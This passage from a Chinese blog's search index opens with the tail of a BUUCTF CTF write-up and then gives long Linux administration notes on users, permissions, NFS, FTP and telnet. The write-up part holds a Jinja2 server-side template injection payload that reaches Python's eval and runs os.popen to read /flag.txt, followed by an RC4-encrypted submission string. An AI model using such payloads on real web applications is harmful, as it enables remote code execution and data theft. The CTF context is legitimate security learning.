c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag.txt&apos;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n加密\n.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23%7E%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96\n\n提交\n\n拿到了flag\n总结这道题知识盲区还挺多，做得起还是靠师傅们的wp，做这种题做完后给我一种感觉，就是觉得还是有很多不会的，但是如果都去深入了解一遍，很耽误做题时间，并且意义不大。\n","categories":["CTF","BUUCTF"],"tags":["CTF","RC4加密解密"]},{"title":"Linux学习笔记","url":"/2021/12/31/Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"\n并未涉及Linux全部内容，根据上课所做的一份笔记\n\n\n\nLinux进入拯救模式修改root密码\n选择系统时按 e\n在 UTF-8 后添加 init=/bin/sh 按ctrl+x 保存启动\n可能会乱码 执行LANG=en\n添加权限mount -o remount rw, /\n修改密码 passwd root\ntouch /.autorelabel\n重启 exec /sbin/init\n\n报错 passwd:Authentication token manipulation error\n\n\n\n\n\n\n\n\n\n\n将 shadow-  重命名为 shadow\n\n\n\n\n\n设置时区查看所有时区命令\ntimedatectl list-timezones\n[root@localhost tmp]# timedatectl list-timezonesAfrica/AbidjanAfrica/AccraAfrica/Addis_AbabaAfrica/AlgiersAfrica/AsmaraAfrica/BamakoAfrica/BanguiAfrica/BanjulAfrica/BissauAfrica/BlantyreAfrica/Brazzaville\n\n设置时区\ntimedatectl set-timezone &quot;Asia/Shanghai&quot;\n查看时间\nclock\n[root@localhost tmp]# clock2021年11月21日 星期日 19时45分48秒  -0.744897 秒\n\ndata -R\n[root@localhost tmp]# date -RSun, 21 Nov 2021 19:44:39 +0800\n\n文件命令相关操作创建文件夹 mkdir\n创建文件 touch 文件名    cat “内容”&gt;文件名    echo “内容”&gt;文件名\n查看文件 cat 文件名\n移动文件 mv 文件名 移动目录/\n删除文件 rm 文件名\n查找文件 find 路径 -name 文件名\n创建一个大小为4G的文件dd if=/dev/zero of=文件名 bs=1 count=0 seek=4G\n[root@localhost tmp]# dd if=/dev/zero of=1.txt bs=1 count=0 seek=4G记录了0+0 的读入记录了0+0 的写出0字节(0 B)已复制，0.00341132 秒，0.0 kB/秒[root@localhost tmp]# ll总用量 4-rw-r--r--. 1 root root 4294967296 11月 21 19:46 1.txt\n\n系统运行级与运行级的切换系统运行级\n\n\n运行级\n状态\n\n\n\n0\n关闭计算机\n\n\n1\n单用户拯救模式\n\n\n2\n多用户模式\n\n\n3\n多用户模式\n\n\n4\n多用户模式\n\n\n5\n多用户模式，用于自动启动XFree86系统(图形界面)\n\n\n6\n重新启动\n\n\nQ/q\n重新加载init守护进程配置\n\n\nU/u\n重新执行init守护进程\n\n\n切换运行级init 1\n\n查看当前系统运行级runlevel\n\n[root@localhost ~]# runlevel1 3\n\n系统运行级的服务chkconfig 查看服务// 只能查看SysV服务，基本被systemctl 命令取代\n\n[root@localhost ~]# chkconfig --list注：该输出结果只显示 SysV 服务，并不包含原生 systemd 服务。SysV 配置数据可能被原生 systemd 配置覆盖。       要列出 systemd 服务，请执行 'systemctl list-unit-files'。      查看在具体 target 启用的服务请执行      'systemctl list-dependencies [target]'。netconsole     \t0:关\t1:关\t2:关\t3:关\t4:关\t5:关\t6:关network        \t0:关\t1:关\t2:开\t3:开\t4:开\t5:开\t6:关\n\nsystemctl\n\n\n列出系统中所有活动的服务\n\n[root@localhost ~]# systemctl -t service  UNIT                               LOAD   ACTIVE SUB     DESCRIPTION  auditd.service                     loaded active running Security Auditing Service  chronyd.service                    loaded active running NTP client/server  crond.service                      loaded active running Command Scheduler  dbus.service                       loaded active running D-Bus System Message Bus  firewalld.service                  loaded active running firewalld - dynamic firewall daemon  getty@tty1.service                 loaded active running Getty on tty1  ● kdump.service                      loaded failed failed  Crash recovery kernel arming  kmod-static-nodes.service          loaded active exited  Create list of required static device nodes for the current kernel  lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling  network.service                    loaded active exited  LSB: Bring up/down networking  NetworkManager-wait-online.service loaded active exited  Network Manager Wait Online  NetworkManager.service             loaded active running Network Manager  polkit.service                     loaded active running Authorization Manager  postfix.service                    loaded active running Postfix Mail Transport Agent  rhel-dmesg.service                 loaded active exited  Dump dmesg to /var/log/dmesg  rhel-domainname.service            loaded active exited  Read and set NIS domainname from /etc/sysconfig/network  rhel-import-state.service          loaded active exited  Import network configuration from initramfs  rhel-readonly.service              loaded active exited  Configure read-only root support  rsyslog.service                    loaded active running System Logging Service  sshd.service                       loaded active running OpenSSH server daemon  systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage  systemd-journald.service           loaded active running Journal Service  systemd-logind.service             loaded active running Login Service  systemd-random-seed.service        loaded active exited  Load/Save Random Seed  systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems  systemd-sysctl.service             loaded active exited  Apply Kernel Variables  systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev  systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories\n\n\n显示系统环境\n[root@localhost ~]# systemctl show-environmentLANG=zh_CN.UTF-8PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin\n\n获取系统默认目标的名称\n[root@localhost ~]# systemctl get-defaultmulti-user.target\n\n禁用sshd服务\n[root@localhost ~]# systemctl disable sshd.serviceRemoved symlink /etc/systemd/system/multi-user.target.wants/sshd.service.// systemctl disable/enable sshd.service disable禁用 enable开启\n\n从系统运行级5切换到系统运行级3\nsystemctlusolate multi-user.target\n\n\n未找到命令\n\n\n显示NFS服务的运行状态\nsystemctl status nfs.service\n\n\n未找到服务\n\n\n\n\n检查是否启用了ssh服务\n[root@localhost ~]# systemctl is-enabled sshdenabled\n\n列出系统上安装的所有单元，包括失效或空的\n[root@localhost ~]# systemctl list-unit-filesUNIT FILE                                     STATE   proc-sys-fs-binfmt_misc.automount             static  dev-hugepages.mount                           static  dev-mqueue.mount                              static  proc-sys-fs-binfmt_misc.mount                 static  sys-fs-fuse-connections.mount                 static  sys-kernel-config.mount                       static  sys-kernel-debug.mount                        static  tmp.mount                                     disabledbrandbot.path                                 disabledsystemd-ask-password-console.path             static  systemd-ask-password-plymouth.path            static  systemd-ask-password-wall.path                static  session-1.scope                               static  session-2.scope                               static  session-3.scope                               static  arp-ethers.service                            disabledauditd.service                                enabled autovt@.service                               enabled blk-availability.service                      disabledbrandbot.service                              static  chrony-dnssrv@.service                        static\n\n\n\n\n\n用户登录与账户管理添加用户\nuseradd [选项] 用户名\n\n\n\n\n选项\n说明\n\n\n\n-c&lt;备注&gt;\n加上备注文章，备注文字会保存在passwd得备注栏位中\n\n\n-d&lt;登录目录&gt;\n指定用户登入时起始目录\n\n\n-D\n变更预设值\n\n\n-e&lt;有效期限&gt;\n指定账户的有效期限\n\n\n-f&lt;缓存天数&gt;\n指定在密码过期后多少天即关闭该帐号。\n\n\n-g&lt;群组&gt;\n指定用户所属的群组。\n\n\n-G&lt;群组&gt;\n指定用户所属的附加群组。\n\n\n-m\n自动建立用户的登入目录。\n\n\n-M\n不要自动建立用户的登入目录。\n\n\n-n\n取消建立以用户名称为名的群组．\n\n\n-s\n指定用户登入后所使用的shell\n\n\n-u\n指定用户ID\n\n\n为添加的用户指定相应的用户组\nuseradd -g root test01\n\n创建一个系统用户\nuseradd -r tt\n\n为新添加的用户指定home目录\nuseradd -d /home/test01 test01\n\n设置用户密码\npasswd 用户名\n\n批量创建用户\n\n创建userfile.txt的文件\nstudent01:x:520:520::/home/student01:/sbin/nologinstudent02:x:521:521::/home/student02:/sbin/nologin\n\n\n\n\n\n\n\n\n\n创建对应的userpwdfile.txt\nstudent01:123456student02:123456\n\n\n\n\n\n\n\n\n\n使用newusers批量添加用户\nnewusers userfile.txt\n\n\n\n\n\n\n\n| ![image-20211217090840336](https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20211217090840336.png) |\n| ------------------------------------------------------------ |\nchpasswd批量修改密码\n\n执行命令/usr/sbin/pwunconv，将/etc/shadow产生的shadow密码解码，然后回写到/etc/passwd中， 并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消shadow password功能，关闭影子文件。\n\npwunconv // chpasswd &lt; userpwdfile.txt // 批量修改密码pwunconv // 恢复影子文件\n\n\n\n\n\n\n\n\ncat /etc/passwd\n\n\n\n\n\n\n\n删除用户\nuserdel [-r] 用户名// -r 代表递归删除用户目录下的所有文件和文件夹\n\n用户组操作添加用户群组groupadd [选项] group// group群组名\n\n删除用户群组grouddel group// group 群组名\n\n为用户添加用户组\n-a 代表 append， 也就是 将自己添加到 用户组groupA 中，而不必离开 其他用户组。 \n\nusermod -a -G groupA user\n\n将用户登录名test01修改为test02，将工作目录改为/home/test02，将所属群组该为root\nusermod -l test01 test02 -d /home/test02 -m -g root\n\n将用户从用户组中移除gpasswd -d userName groupName\n\n修改用户群组属性groupmod [-g gid [-o]][-n new_group_name] old_group_name\n\n\n\n\n选项\n说明\n\n\n\n-g gid\n设置新群组的标识号\n\n\n-o\n重复使用群组的标识号\n\n\n-n old_name new_name\n设置新群组名称\n\n\n​      \n查看登录用户who 查看目前登录的用户信息\nw 查询登录用户的详细信息\nlast 搜索/var/log/wtmp文件 显示自创建该文件以来登录(和退出)的所有用户列表\nlastlog 显示所有用户的最近登录情况，或者指定用户最近的登录情况\n查看近两年登录的用户\nlastlog -t 2\n\n改变用户身份su\n用法： su [选项] [-] [USER [参数]...]将有效用户 id 和组 id 更改为 USER 的 id。单个 - 视为 -l。如果未指定 USER，将假定为 root。选项： -m, -p, --preserve-environment  不重置环境变量 -g, --group &lt;组&gt;             指定主组 -G, --supp-group &lt;组&gt;        指定一个辅助组 -, -l, --login                  使 shell 成为登录 shell -c, --command &lt;命令&gt;            使用 -c 向 shell 传递一条命令 --session-command &lt;命令&gt;        使用 -c 向 shell 传递一条命令                                 而不创建新会话 -f, --fast                      向shell 传递 -f 选项(csh 或 tcsh) -s, --shell &lt;shell&gt;             若 /etc/shells 允许，则运行 shell -h, --help     显示此帮助并退出 -V, --version  输出版本信息并退出\n\n在低权限用户下用root用户执行命令\nsu -c \"whoami\" root\n\nsudo\nsudo - 以其他用户身份执行一条命令usage: sudo -h | -K | -k | -Vusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [&lt;command&gt;]usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...选项：  -A, --askpass                 使用助手程序进行密码提示  -b, --background              在后台运行命令  -C, --close-from=num          关闭所有 &gt;= num 的文件描述符  -E, --preserve-env            在执行命令时保留用户环境      --preserve-env=list       保留特定的环境变量  -e, --edit                    编辑文件而非执行命令  -g, --group=group             以指定的用户组或 ID 执行命令  -H, --set-home                将 HOME 变量设为目标用户的主目录。  -h, --help                    显示帮助消息并退出  -h, --host=host               在主机上运行命令(如果插件支持)  -i, --login                   以目标用户身份运行一个登录 shell；可同时指定一条命令  -K, --remove-timestamp        完全移除时间戳文件  -k, --reset-timestamp         无效的时间戳文件  -l, --list                    列出用户权限或检查某个特定命令；对于长格式，使用两次  -n, --non-interactive         非交互模式，不提示  -P, --preserve-groups         保留组向量，而非设置为目标的组向量  -p, --prompt=prompt           使用指定的密码提示  -r, --role=role               以指定的角色创建 SELinux 安全环境  -S, --stdin                   从标准输入读取密码  -s, --shell                   以目标用户运行 shell；可同时指定一条命令  -t, --type=type               以指定的类型创建 SELinux 安全环境  -T, --command-timeout=timeout 在达到指定时间限制后终止命令  -U, --other-user=user         在列表模式中显示用户的权限  -u, --user=user               以指定用户或 ID 运行命令(或编辑文件)  -V, --version                 显示版本信息并退出  -v, --validate                更新用户的时间戳而不执行命令  --                            停止处理命令行参数\n\n文件系统管理软连接硬链接\nln \n\n\n\n参数\n说明\n\n\n\n-s\n创建软连接\n\n\n-d\n创建硬链接（不写默认）\n\n\n软硬链接区别\n\n软连接\n软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n软链接可以 跨文件系统 ，硬链接不可以\n软链接可以对一个不存在的文件名进行链接\n软链接可以对目录进行链接\n\n\n硬链接\n硬链接，以文件副本的形式存在。但不占用实际空间。\n不允许给目录创建硬链接\n硬链接只有在同一个文件系统中才能创建\n\n\n\n给文件创建一个软连接\nln -s log2013.log link2013\n\n给文件创建一个硬连接\nln log2013.log ln2013\n\n查看磁盘分区信息\n/sbin/fdisk -l\n\n\n\n\n\n\n\n\n文件权限chmod u+s  [file] // 给用户的某个文件增加超级权限\n\n参数\nu 文件所有者g 用户组o 其他用户a 所有用户--------------------------------------r(4) 读取权限w(2) 写入权限x(1) 执行权限t 粘贴位（给其他用户(o)设置超级权限的时候,没有执行权限(x)显示T,如果其他用户有执行权限(x)，那么就会变成t）s 特殊权限 - 没有权限所属者 对应 SUID 特殊权限所有者 对应 SGID 特殊权限所有人 对应 sticky 特殊权限当设置特殊权限为4 4转换为2进制为100分别对应所属者  所属组  所有人  1 \t0\t   0  那么特殊权限为SUID当设置特殊权限为1 1转换为2进制为001分别对应所属者  所属组  所有人  0 \t0\t   1  那么特殊权限为sticky\n\n特殊权限\n\n当权限编码数字长度为4个的时候，第一位表示特殊权限，后三位表示普通权限\n第一位表示特殊权限时，具体分为8中情况：\n当第一位是0，特殊权限为空\n当第一位是1，特殊权限为sticky\n当第一位是2，特殊权限为SGID\n当第一位是3，特殊权限为SGID,sticky\n当第一位是4，特殊权限为SUID\n当第一位是5，特殊权限为SUID,sticky\n当第一位是6，特殊权限为SUID,SGID\n当第一位是7，特殊权限为SUID,SGID,sticky\n\n快速转换十进制转二进制转换表\n1 2 4 8 16 32 64 128\n\n将 77 转为二进制\n1 2 4 8 16 32 64 1280 0 0 0  0  0  0  0 77 在 64 -128 区间内在64 位将0 替换为11 2 4 8 16 32 64 1280 0 0 0  0  0  1  0 在将 77 - 64 = 1313 在 在 8 - 16 区间在8 位将0 替换为11 2 4 8 16 32 64 1280 0 0 1  0  0  1  0 在将 13 - 8 = 55 在 在 4 - 8 区间在4 位将0 替换为11 2 4 8 16 32 64 1280 0 1 1  0  0  1  0 在将 5 - 1 = 11 就是第一位直接将第一位替换为 11 2 4 8 16 32 64 1281 0 1 1  0  0  1  0 得到 10110010 反过来1001101 这就是 77 的二进制有了这个表 z\n\nchmod 4755 file\n\n这个4表示其他用户执行该文件时，具有该文件所有者一样的权限\n\n查看文件基本信息stat查看文件的修改信息\n\n\n\n\n\n\n\n查看环境变量echo $PATH\n\n\n\n\n\n\n\n磁盘分区查看磁盘容量\ndf -h\n\n\n\n\n\n\n\n\n查看指定文件或目录大小\ndu -h /etc/passwd\n\n\n\n\n\n\n\n\n磁盘分区\n\n在分区前先给虚拟机添加一块硬盘\n\n\n\n\n查看磁盘分区\n\n\n\nfdisk -l\n\n\n\n\n\n对刚刚挂载的磁盘分区\n\n\nfdisk /dev/sdb\n\n\n\n\n\nn 新建分区   d 删除分区 l 展示分区编码号 w把实现的分区结果保存在磁盘中\n\n\n\n\n\n可选  p(primary) 和 e (extended)\n\n\n\n\n\n查看分区结果\n\n\n\n\n\n格式化分区\n\n\n\nmkfs.xfs /dev/sdb1\n\n\n\n\n\n\n\n\n\n挂载\n\n\n\n创建一个文件夹\n\n\n\nmkdir   /home/temp_disk\n\n\n将分区挂载到新建的文件夹中\n\n\nmount /dev/sdb1 /root/temp_disk\n\n\n\n\n\n\n\n\n完成\n\n\n报错问题\n问题：mount: block device /dev/sr0 is write-protected, mounting read-only解决方式：mount -o remount,rw /dev/cdrom /mnt/cdrom\n\n卸载\n\n\n\numout 分区名\n\n\n\n\n\n\n删除分区\n\n\nfdisk /dev/sdb\n\n\n\n\n\ncentos7 启用NFS服务\nyum.pid被锁定或sleeping \n使用\nrm -rf /var/run/yum/pid\n\n\n条件：两台虚拟机\n\n\n\n\n在A主机上操作\n\n\n\nyum install -y nfs-utils rpcbind  // 安装nfs\n\n\n\n\n\nmkdir /root/data  // 创建共享目录\n\n\n\n\n\nsystemctl start nfs   // 启动nfs\n\n\n\n\n\n编辑 vim /etc/exports    \n/root/data/ 172.20.10.0/24(rw,sync,all_squash)\n\n\n\n\n\n\n\n\n检查端口启动情况\n\n\n\n\n\n\n\n// 不关无法访问\nsystemctl stop firewalld.service  关闭防火墙\n\n\n\n在主机B上操作\n\n\n\nyum install -y nfs-utils rpcbind   // 安装nfs\n\n\n\n\n\nshowmount -e 172.20.10.134  // 在主机B上查看A可提供的挂载信息\n\n\n如果没有显示，重新在A主机重启nfs服务\n\n\nmkdir /mnt/test1  //创建挂载目录\n\n\nmount -t nfs 172.20.10.134:/root/data /mnt/test1   //在主机B上实现NFS的挂载\n\n\n\n\n\ndf -h  // 查看是否挂载成功\n\n\n\n\n\n成功\n\n\n\n\n\n创建文件测试\n\n\n\n\n\n\n解决方式（在主机A 上 给data目录改变权限）\n\n\nchown -R nfsnobody:nfsnobody /root/data/\n\n\n\n\n\n再次测试\n\n\n成功\n\n\n卸载nfs\n查找服务名\nrpm -qa | grep nfsrpm -qa | grep rpcbind\n\n\n\n\n\n\n\n\n卸载查找到的服务名\nyum remove -y 服务名\n\n磁盘文件与目录管理磁盘管理df 查看磁盘空间的使用情况\n\n\ndf -h 以便于阅读的方式输出磁盘空间信息\n\n\n\n\n\n\ndu 显示磁盘上目录或文件的大小\n\n\ndu -h  [文件或目录]    以便于阅读的方式输出\n\n\n\n\n\n\npwd 显示当前目录\n\n\n显示当前目录\n\n\n\n\n\n\n查看文件内容的方式find 查找文件\n以文件名称、后缀名、文件相关用户、文件大小、文件类型、文件访问、修改时间等去查询文件，但不包括以文件内容去查询\n\n\n\n\n列出当前目录及字目录下后缀为txt的所有文件\n\n\n\nfind ./ -name “*.txt”\n\n\n\n\n\n列出当前目录及字目录下所有文件\n\n\nfind ./ -type f （f 一般文件 d 目录 l 链接文件）\n\n\n\n\n\n将查询出来的文件以ls输出方式显示出来\n\n\nfind -iname “*.txt” -exec ls -lh {} ;\n\n\nfind -iname “*.txt” -ok  [命令] {} ;  // 与上一个命令功能一样，区别在于-ok 执行命令时 会询问用户\n\n\n\n\n\n按照权限查找文件\n\n\nfind -perm 755\n\n\n\n\n\n按照用户查找文件\n\n\nfind -user admin\n\n\n\n\n\n按照文件的所属组来进行查找\n\n\nfind -group 文件所属组名\n\n\nfind -atime -1 （-1 一天以内 +1 一天以前）\n\n\natime n天内被读取   mtime n月被读取   ctime n分钟被读取  aminn天内被修改   mminn月内被修改    cminn分钟内被修改\n\n\n\n\n\n根据文件的大小来查找文件find -size 1Mfind -size -1M // 查找小于1MB的文件find -size +1M // 查找大于1MB的文件\n\n按照文件的深度层次来进行查找find -depth -iname &quot;*.txt&quot; 将指定路径作为第一层，向下遍历到最深处，来查找每一层满足指定条件的文件find -maxdepth -iname &quot;*.txt&quot; 将指定路径作为第一层，向下遍历到第n层，来查找每一层满足指定条件的文件find -mindepth -iname &quot;*.txt&quot; 将指定路径作为第一层，从第n层开始向下遍历到最深处，来查找每一层满足指定条件的文件\n\n将多个条件按照指定逻辑组合在一起进行文件查找逻辑组合有\t-a: and 表示多个条件同时满足\t-o: or 表示多个条件只需要满足一个即可find -type f -o -iname &quot;*.txt&quot;find -type f -a -iname &quot;*&quot;\n\nchmod 修改文件权限\ncat 查看文件内容\n适合查看行数较少的文件\n\nhead\n查看文件的开头部分的内容\n\n\n\n\n参数\n说明\n\n\n\n-q\n隐藏文件名\n\n\n-v\n显示文件名\n\n\n-c&lt;数目&gt;\n显示的字节数\n\n\n-n&lt;行数&gt;\n显示的行数\n\n\nmore\n类似 cat ，不过会以一页一页的形式显示\n\n\nEnter 向下n行，需要定义。默认为1行\nCtrl+F 向下滚动一屏\n空格键 向下滚动一屏\nCtrl+B 返回上一屏\n= 输出当前行的行号\n：f 输出文件名和当前行的行号\nV 调用vi编辑器\n!命令 调用Shell，并执行命令\nq 退出more\n\n\n\n\n\n\n\n说明\n参数\n\n\n\n-num\n一次显示的行数\n\n\n+num\n从第 num 行开始显示\n\n\nless\n进行文件内容的查看（适合查看大文件，相比与more，他的功能更全）\n\n\nenter：逐行下翻\n空格：逐页下翻\nctrl+f:：逐页下翻\nctrl+b：逐页上翻\n\n\n\n\nless +/关键字 filename \n\n文本中关键字高亮显示\n\nless +n filename\n\n从第n行开始进行文件内容的查看\n\nless +/关键字.\\\n\n高亮显示任意文件中的关键字\n\nless -N filename\n\n显示行号\n\ntail文件压缩与解压缩compress/uncompress压缩\ncompress filename\n解压\nuncompress filename\ngzip/gunzip压缩\ngizp filename\n解压\ngunzip filename\n文件备份与恢复tar压缩\ntar -zcvf 原文件名.tar.gz 源文件名\n解压\ntar -xzvf 压缩包.tar.gz\n简单信息处理wc\n显示文件基本的统计信息（对应的行数、词数、字符数、文件名）\n\n\n\n\n\n\n\n\n\n显示多个文件\nwc /目录/&#123;file1, file2&#125;\n\n\n\ngrep\n查找文件内容\n语法\ngrep 关键字 文件名\n\n\n\ngrep -c 关键字 文件名// 统计关键字在文本当中出现的次数\n\n\n\n\n\n\n\n\ngrep -c -i 关键字 文件名// -i 忽略大小写grep -c -i 关键字 *.txt// -i 忽略大小写// *.txt 指定任意文件名类型为txt的文件grep -c -i 关键字 *.*// -i 忽略大小写// *.* 指定任意文件名任意类型的文件grep -c -i 关键字 /*// -i 忽略大小写// /* 指定路径下所有文件\n\ngrep -n 关键字 filename// 显示增加行号\n\n\n\n\n\n\n\n\ngrep -v 关键字 filename// 反向匹配，显示没有匹配到的行\n\n\n\n\n\n\n\n\nsort\n排序：是对文件的每一行进行排序（依据ASCII值）\nASCII：American standard code of information interchage\n0-9:48-57\nA-Z:65-96\na-z:97-122\n\nsort filenamesort -g filename// sort -n filenamesort -r filename\n\ncut\n展现文件的局部范围的内容\ncut -b 2-5,8,10 filename\n\nuniq\n文本去重\n\n在进行去重显示的时候，去重的规则是：连续重复出现\n\n\n\nuniq filename 进行文件的去重展示uniq -c filename 针对文件当中出现的重复行进行计数uniq -u filename 将没有连续重复出现的行显示出来uniq -i filename 将连续重复出现的行忽略大小写，作为重复行，将进行去重显示\n\nLinux包管理RPM\n安装\n查询（查询一个包是否安全）\nrpm -qa |grep telnet\n\n\n检验：检验包安装的正确性\n包升级\n包删除\n\nyumyum install -y packagey：代表下载并安装d:仅仅下载，并不安装N：直接退出\n\nyum repolist \n用于列出系统中已配置的yum源\nyumexyum list yumex\nyum list installed\n​        \n进程管理shell编程vivi filename\n命令模式，文本编辑模式，行编辑模式\nvi filename\n命令模式\ni,a,s,o​    esc + shift + Q  进入行编辑模式\n​    esc + 双击y  对光标所在行进行复制\n​    esc + p 对复制的内容进行粘贴\n​    esc + 双击g 将光标移到首行\n​    esc + 双击d 删除当前行\n​    ctrl + insert    对选中的内容进行复制\n​    shift + insert 对已经复制的内容进行粘贴\n文本编辑模式\n​    内容编辑\n行编辑模式\n​    q，q!，wq，w,wq!\n​    /1  /[0-9]\n​    ?1\n\n未完待续\n\n服务器搭建centos7 搭建ftp服务器\n安装vsftpd\nyum install -y vsftpd\n\n\n\n\n\n\n\n\n\n\n\n启动ftp服务器\nsystemctl start vsftpd.service\n\n\n\n\n\n\n\n\n\n\n\n配置ftp\n\n配置文件目录\n\n/etc/vsftpd/vsftpd.conf\n\n\n\n#除下面提及的参数，其他参数保持默认值即可。#修改下列参数的值：#禁止匿名登录FTP服务器。anonymous_enable=NO#允许本地用户登录FTP服务器。local_enable=YES#监听IPv4 sockets。listen=YES#在行首添加#注释掉以下参数：#关闭监听IPv6 sockets。#listen_ipv6=YES# 可能配置会没有 需要手动加入 #在配置文件的末尾添加下列参数：#设置本地用户登录后所在目录。 local_root=/var/ftp/test#全部用户被限制在主目录。chroot_local_user=YES#启用例外用户名单。chroot_list_enable=YES#指定例外用户列表文件，列表中用户不被锁定在主目录。chroot_list_file=/etc/vsftpd/chroot_list# vim 跳转到行末 :$#开启被动模式。pasv_enable=YESallow_writeable_chroot=YES#本教程中为Linux实例的公网IP。pasv_address=&lt;FTP服务器公网IP地址&gt;#设置被动模式下，建立数据传输可使用的端口范围的最小值。#建议您把端口范围设置在一段比较高的范围内，例如50000~50010，有助于提高访问FTP服务器的安全性。pasv_min_port=&lt;port number&gt;#设置被动模式下，建立数据传输可使用的端口范围的最大值。pasv_max_port=&lt;port number&gt;\n\n\n\n\n\n\n\n\n\n防火墙放行相应端口\n\n关闭防火墙命令\nsystemctl stop firewalld\n\n添加主端口\nfirewall-cmd --permanent --zone=public --add-port=21/tcp\n\n\n\n\n\n\n\n\n\n\n\n\n\n添加被动端口\nfirewall-cmd --permanent --zone=public --add-port=65400-65410/tcp\n\n\n\n\n\n\n\n\n\n\n\n重新加载防火墙\nfirewall-cmd --reload\n\n\n\n\n\n\n\n\n\n\n\n创建ftp用户\n# 创建一个Linux用户adduser ftptest# 修改ftptest用户的密码passwd ftptest# 创建一个供FTP服务使用的文件目录mkdir /var/ftp/test# 创建测试文件touch /var/ftp/test/testfile.txt# 运行以下命令更改/var/ftp/test目录的拥有者为ftptestchown -R ftptest:ftptest /var/ftp/test\n\n\n\n\n\n\n\n\n\n设置ftp服务开机启动\nsystemctl enable vsftpd.service\n\n\n\n\n\n\n\n\n\n\n\n测试\n\n\n\n登录\n\n\n\n\n\n\n\n\n\n\n\n卸载ftp服务器\n\n查找vsftpd服务\nrpm -aq vsftpd\n\n停止ftp服务\nsystemctl stop vsftpd.service\n\n卸载ftp服务\nrpm -e vsftpd-3.0.2-21.el7.x86_64\n\n\n\ncentos7 搭建telent服务\n先检查是否安装了telnet\nrpm -qa | grep telnet   //检查你的CentOS是否安装了telnet和telnet-serverrpm -qa xinetd   //检查你的CentOS是否安装了xinetd，telnet的自启动依赖它\n\n执行后都为空就是没有安装。\n\n安装telnet并设置开机自启动\n\n\n\n\n\nyum list |grep telnet   //列出当前可用的rpm包\n\n\n\n\n\n\nyum install telnet-server　　//安装telnet-server 服务端\n\n\n\n\n\nyum install telnet　　　　//安装telnet 客户端\n\n\n\n\n\n\n安装xinetd\n\n\n\nyum install -y xinetd\n\n\n\n\n\n\nsystemctl enable xinetd.service  //设置xinetd开机自启动\n\n\nsystemctl start xinetd.service  //启动xinetd\n\n\nsystemctl status xinetd.service  //查看xinetd状态\n\n\n\n\n\n\n设置telnet服务开机启动\n\n\n\nsystemctl enable telnet.socket //设置telnet服务开机启动\n\n\n\nsystemctl start telnet.socket //启动telnet服务\n\n\nsystemctl restart xinetd //telnet服务依赖xinetd守护，安装telnet-server后启动时需要重启xinetd服务\n\n\n\n\n\n\n防火墙放行23端口\n\n\n\nCentOS采用了 firewalld 防火墙,查询是否开启23端口\n\n\n\nfirewall-cmd –query-port=23/tcp\n\n\n\n\n\nfirewall-cmd –zone=public –add-port=23/tcp –permanent  // 放行23端口\n\n\nfirewall-cmd –complete-reload // 重新加载firewall-cmd\n\n\n\n\n\n\n修改telnet配置文件，开启服务\n\n/etc/xinetd.d/telnet // 没有就自己创建\n\n\n\n\nvim /etc/xinetd.d/telnet\n\n\n\n\n\n\nps -ef |  grep xinetd // 查看xinetd是否启动\n\n\n\n\n\n\n测试\n\n\n\ntelnet localhost // 登录测试\n\n\n\n\n\n\nLogin incorrect 报错解决\n\n\n\n\n\n查看日志\n\n\ntail /var/log/secure\n\n\n\n\n\nvim /etc/securetty  //在该文件末尾添加pts/4\n\n\n\n\n\n再次测试\n\n\n\n\n\n成功\n\n\n\n卸载telnet\n\n\n\nrpm -qa |  grep telnet  #显示telnet-server和telnet包\n\n\n\n\n\n\nrpm -e telnet-0.17 #卸载telnet客户端\n\n\nrpm -e telnet-server-0.17 #卸载telnet服务端\n\n\nrpm -qa |grep xinetd   // 显示xinetd包\n\n\nrpm -e xinetd-2.3.15-14.el7.x86_64 // 